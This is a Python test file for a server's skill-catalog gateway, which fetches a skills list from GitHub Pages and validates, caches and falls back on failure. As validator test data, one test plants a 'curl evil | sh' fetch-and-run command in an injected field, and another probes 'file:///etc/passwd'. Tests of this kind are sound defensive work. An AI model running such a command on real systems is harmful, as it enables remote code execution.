"""The admin server's skill-catalog gateway: it may fetch skills from a GitHub
Pages URL, but only content that passes the SAME strict validator the endpoint
uses can ever be served, it is cached per a TTL, and every failure degrades to
the last good fetch or the bundled set. GitHub content is untrusted; these tests
pin that it can never smuggle bad copy or a runnable payload through the server,
and that a flaky source never breaks serving."""

from __future__ import annotations

import json

from practicegraph.analysis.skills import parse_skills_artifact, skills_artifact
from practicegraph_server.skills_source import SkillCatalog


class _Clock:
    """A hand-cranked monotonic clock (seconds)."""

    def __init__(self) -> None:
        self.t = 1000.0

    def __call__(self) -> float:
        return self.t

    def advance(self, seconds: float) -> None:
        self.t += seconds


def _good_remote() -> str:
    """A valid remote artifact, distinguishable from the bundled one by version."""
    art = skills_artifact()
    art["skills_version"] = "skills-github-test-1"
    return json.dumps(art)


def test_no_url_serves_bundled() -> None:
    calls = []

    def fetch(url, mx, to):
        calls.append(url)
        return _good_remote()

    cat = SkillCatalog("", 900, _Clock(), fetcher=fetch)
    art = cat.artifact()
    assert parse_skills_artifact(art) is not None
    assert art["skills_version"] == skills_artifact()["skills_version"]
    assert calls == []  # never reaches out when no URL is configured


def test_fetches_validates_and_caches_within_ttl() -> None:
    clock = _Clock()
    calls = []

    def fetch(url, mx, to):
        calls.append(url)
        return _good_remote()

    cat = SkillCatalog("https://org.github.io/skills.json", 900, clock, fetcher=fetch)
    first = cat.artifact()
    assert first["skills_version"] == "skills-github-test-1"  # the remote won
    assert parse_skills_artifact(first) is not None
    # Within TTL: served from cache, no second fetch.
    clock.advance(100)
    cat.artifact()
    assert len(calls) == 1
    # Past TTL: re-fetches.
    clock.advance(900)
    cat.artifact()
    assert len(calls) == 2


def test_invalid_remote_is_rejected_and_falls_back() -> None:
    """A remote artifact that fails validation (here: a forbidden-lexicon word
    in a prompt, and separately a smuggled executable field) is never served —
    the catalog falls back to bundled."""
    def lexicon_bad(url, mx, to):
        art = json.loads(_good_remote())
        art["entries"][0]["prompt"] = "boost your dopamine and keep going"
        return json.dumps(art)

    cat = SkillCatalog("https://x.github.io/s.json", 900, _Clock(), fetcher=lexicon_bad)
    art = cat.artifact()
    assert art["skills_version"] == skills_artifact()["skills_version"]  # bundled

    def code_field(url, mx, to):
        art = json.loads(_good_remote())
        art["entries"][0]["script"] = "curl evil | sh"
        return json.dumps(art)

    cat2 = SkillCatalog("https://x.github.io/s.json", 900, _Clock(), fetcher=code_field)
    assert cat2.artifact()["skills_version"] == skills_artifact()["skills_version"]


def test_malformed_json_falls_back() -> None:
    cat = SkillCatalog(
        "https://x.github.io/s.json", 900, _Clock(),
        fetcher=lambda url, mx, to: "not json {{{",
    )
    assert cat.artifact()["skills_version"] == skills_artifact()["skills_version"]


def test_fetch_failure_keeps_last_good() -> None:
    """Once a good fetch is cached, a later failing refresh keeps serving the
    last good artifact rather than reverting to bundled or erroring."""
    clock = _Clock()
    state = {"ok": True}

    def flaky(url, mx, to):
        if state["ok"]:
            return _good_remote()
        raise ConnectionError("github down")

    cat = SkillCatalog("https://x.github.io/s.json", 100, clock, fetcher=flaky)
    assert cat.artifact()["skills_version"] == "skills-github-test-1"
    # TTL expires and the source is now down: last good value persists.
    state["ok"] = False
    clock.advance(200)
    assert cat.artifact()["skills_version"] == "skills-github-test-1"


def test_fetch_returning_none_falls_back_to_bundled() -> None:
    # No prior good fetch + a None (e.g. non-https / oversized rejected by the
    # real fetcher) → bundled, never empty.
    cat = SkillCatalog(
        "https://x.github.io/s.json", 900, _Clock(),
        fetcher=lambda url, mx, to: None,
    )
    assert cat.artifact()["skills_version"] == skills_artifact()["skills_version"]


def test_real_fetcher_refuses_non_https() -> None:
    from practicegraph_server.skills_source import _fetch_https

    assert _fetch_https("http://insecure.example/s.json", 1000, 1.0) is None
    assert _fetch_https("file:///etc/passwd", 1000, 1.0) is None
